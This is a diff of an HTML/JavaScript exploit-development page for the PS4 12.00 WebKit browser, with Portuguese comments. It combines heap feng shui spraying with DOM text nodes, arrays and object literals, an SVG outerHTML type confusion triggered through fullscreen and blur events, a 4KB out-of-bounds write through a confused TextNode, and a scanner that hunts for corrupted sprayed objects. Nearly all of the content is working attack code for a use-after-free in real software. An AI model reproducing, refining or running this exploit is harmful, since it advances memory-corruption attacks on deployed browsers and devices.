@@ -2,11 +2,11 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - UAF Long Range Probe</title>
+<title>PS4 12.00 - UAF Common Object Overlap</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>UAF → Long Range Overwrite → JSC Scan</h2>
+<h2>UAF → FastMalloc → Common JS Object Scan</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
@@ -20,39 +20,37 @@ function log(msg){
 }
 
 // ==========================
-// 🌍 HEAP FENG SHUI INTERCALADO (MANTIDO)
+// 🌍 HEAP FENG SHUI (ATUALIZADO SEM FLOAT64ARRAY)
 function setupInterleavedFengShui(){
-    log("[*] Iniciando Interleaved Heap Spray...");
+    log("[*] Iniciando Interleaved Spray (Array/Objeto)...");
 
     window.dom_spray = [];
-    window.heap_spray = [];
-    window.obj_spray = [];
+    window.heap_spray = []; // Agora são Arrays Comuns
+    window.obj_spray = [];  // Agora são Objetos Literais
 
     for(let i=0; i<6000; i++){
-        let t = document.createTextNode("TXT_" + i);
+        // 1. Isca DOM (Buffer de texto um pouco maior para parear com a corrupção)
+        let t = document.createTextNode("TXT_BAIT_" + i + "_" + "B".repeat(0x80));
         document.body.appendChild(t);
         window.dom_spray.push(t);
 
-        let d1 = document.createElement("div");
-        d1.innerHTML = "EL_" + i;
-        document.body.appendChild(d1);
-        window.dom_spray.push(d1);
+        // 2. Isca de Array Normal do JS (Fora do Gigacage!)
+        let normal_array = [0x1337, i, 0x1337, i];
+        window.heap_spray.push(normal_array);
 
-        if(i < 5000){
-            let f = new Float64Array(8);
-            f[0] = i; 
-            window.heap_spray.push(f);
-            window.obj_spray.push({ pwn_id: i, pwn_val: 0x1337 });
-        }
+        // 3. Isca de Objeto JS Literal
+        let normal_obj = { signature: 0x1337, id: i, payload: "ISCA" };
+        window.obj_spray.push(normal_obj);
     }
-    log("[*] Spray concluído!");
+
+    log("[*] Spray de Objetos Comuns concluído!");
 }
 
 // ==========================
-// HEAP SETUP (100% INALTERADO)
+// HEAP SETUP ORIGINAL (100% INALTERADO - Mantém a pressão do bug)
 function setupHeap(){
     let arr=[];
-    for(let i=0; i<5000; i++){
+    for(let i=0;i<5000;i++){
         let a=new Float64Array(8);
         a[0]=i;
         arr.push(a);
@@ -90,7 +88,7 @@ function reclaim(size){
 }
 
 // ==========================
-// 💥 SVG CONFUSION (MANTIDO)
+// 💥 SVG CONFUSION (100% INALTERADO)
 function inject(child){
     try{
         child.outerHTML = `
@@ -106,9 +104,9 @@ function inject(child){
 }
 
 // ==========================
-// 🔬 LONG RANGE PROBE
+// 🔬 PROBE ATUALIZADO PARA OBJETOS COMUNS
 function domOverlapProbe(fsTarget){
-    log("---- LONG RANGE PROBE ----");
+    log("---- PROBE DE OBJETOS COMUNS ----");
 
     try{
         let n = fsTarget.firstChild;
@@ -117,10 +115,10 @@ function domOverlapProbe(fsTarget){
         if(n.nodeType === 3){
             log("[!!!] TEXTNODE CONFUSION");
 
-            // 🚀 AUMENTAMOS O TIRO: 0x200 -> 0x1000 (4KB)
+            // 💣 DISPARA O TIRO LONGO (4KB de "A"s)
             try{
                 n.data = "A".repeat(0x1000); 
-                log("[PWN] Long range write OK");
+                log("[PWN] Escrita OOB disparada (4KB)");
             }catch(e){
                 log("[UAF] write crash");
             }
@@ -128,36 +126,36 @@ function domOverlapProbe(fsTarget){
             // ==========================
             // 🔥 SCANNER
             try{
-                // 1. Scan DOM
-                for(let i=0;i<window.dom_spray.length;i++){
-                    let obj = window.dom_spray[i];
-                    if(obj.nodeType === 3 && (!obj.data || !obj.data.includes("TXT_"))){
-                        log("[!!!] DOM CORRUPT @ " + i);
+                // 1. Checa as Iscas de Array Normal
+                for(let i=0; i<window.heap_spray.length; i++){
+                    if(window.heap_spray[i][0] !== 0x1337){
+                        log("[$$$] JACKPOT JSC! Array normal corrompido @ " + i);
                         return;
                     }
                 }
 
-                // 2. Scan JSC Heap
-                for(let i=0; i<window.heap_spray.length; i++){
-                    // Checamos se o valor mudou (Jackpot de Valor)
-                    if(window.heap_spray[i][0] !== i){
-                        log("[$$$] JACKPOT! VALOR CORROMPIDO @ " + i);
-                        log("[$$$] Novo valor: " + window.heap_spray[i][0]);
-                        return;
-                    }
-                    // Checamos se o length mudou (Jackpot de Primitiva)
-                    if(window.heap_spray[i].length !== 8){
-                        log("[$$$] JACKPOT! LENGTH CORROMPIDO @ " + i);
-                        log("[$$$] Novo length: " + window.heap_spray[i].length);
+                // 2. Checa as Iscas de Objetos Literais
+                for(let i=0; i<window.obj_spray.length; i++){
+                    if(window.obj_spray[i].signature !== 0x1337){
+                        log("[$$$] JACKPOT JSC! Objeto literal corrompido @ " + i);
                         return;
                     }
                 }
-                log("[SCAN] Tudo intacto (Tentando aumentar alcance...)");
+
+                // 3. Checa o próprio DOM TextNode vizinho
+                for(let i=0; i<window.dom_spray.length; i++){
+                    let txt = window.dom_spray[i].data;
+                    if(!txt || !txt.includes("TXT_BAIT_")){
+                        log("[!!!] DOM TextNode Vizinho corrompido @ " + i);
+                        return;
+                    }
+                }
+
+                log("[SCAN] Nada atingido ainda...");
 
             }catch(e){
                 log("[UAF] scan crash");
             }
-
         }
     }catch(e){
         log("[UAF] probe crash");
@@ -185,7 +183,6 @@ function trigger(fsTarget){
         }catch(e){}
     }, 30);
 
-    // Três tentativas com intervalos para capturar a realocação
     setTimeout(()=>domOverlapProbe(fsTarget), 80);
     setTimeout(()=>domOverlapProbe(fsTarget), 180);
     setTimeout(()=>domOverlapProbe(fsTarget), 280);
@@ -198,7 +195,13 @@ function trigger(fsTarget){
 // MAIN
 function runTest(){
     log("[*] Iniciando teste...");
+    
+    // Executa a pressão de memória obrigatória que você descobriu (Float64Array intocável)
+    window.heap_press = setupHeap(); 
+
+    // Aloca nossas novas iscas fracas!
     setupInterleavedFengShui(); 
+
     let fsTarget=setupFullscreen();
     window.onblur=function(){
         log("[*] onblur");
